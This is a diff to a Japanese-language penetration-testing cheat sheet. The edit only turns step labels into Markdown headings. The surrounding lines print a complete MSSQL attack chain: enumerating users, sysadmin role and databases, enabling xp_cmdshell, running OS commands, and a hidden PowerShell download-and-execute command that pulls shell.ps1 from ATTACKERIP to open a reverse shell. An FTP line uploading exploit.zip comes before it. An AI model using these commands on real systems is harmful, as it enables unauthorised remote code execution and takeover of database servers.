@@ -121,38 +121,38 @@ put exploit.zip exploit.zip
 get file.txt
 
 ## 🔴SQL
-✅【1】現在のユーザーと権限の確認
+### ✅【1】現在のユーザーと権限の確認
 SELECT SYSTEM_USER;
 
 SELECT USER_NAME();
 
 SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1ならsysadmin権限あり
 
-✅【2】データベース列挙
+### ✅【2】データベース列挙
 SELECT name FROM master..sysdatabases;
 
 SELECT name FROM sys.databases;
 
-✅【3】ログインユーザー列挙
+### ✅【3】ログインユーザー列挙
 SELECT name FROM master.sys.sql_logins;
 
 
-✅【4】RCEが可能か調べる：xp_cmdshell の有効化
+### ✅【4】RCEが可能か調べる：xp_cmdshell の有効化
 EXEC sp_configure 'show advanced options', 1;
 
 RECONFIGURE;
 
 EXEC sp_configure;  -- 'xp_cmdshell' の行を確認
 
-✅【5】xp_cmdshell を有効化（許可されていれば）
+### ✅【5】xp_cmdshell を有効化（許可されていれば）
 EXEC sp_configure 'xp_cmdshell', 1;
 
 RECONFIGURE;
 
-✅【6】OSコマンド実行（RCE）
+### ✅【6】OSコマンド実行（RCE）
 EXEC xp_cmdshell 'whoami';
 
-✅【7】リバースシェル投下例（ネットワークが許せば）
+### ✅【7】リバースシェル投下例（ネットワークが許せば）
 EXEC xp_cmdshell 'powershell -NoP -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKERIP/shell.ps1'')"';
 
 
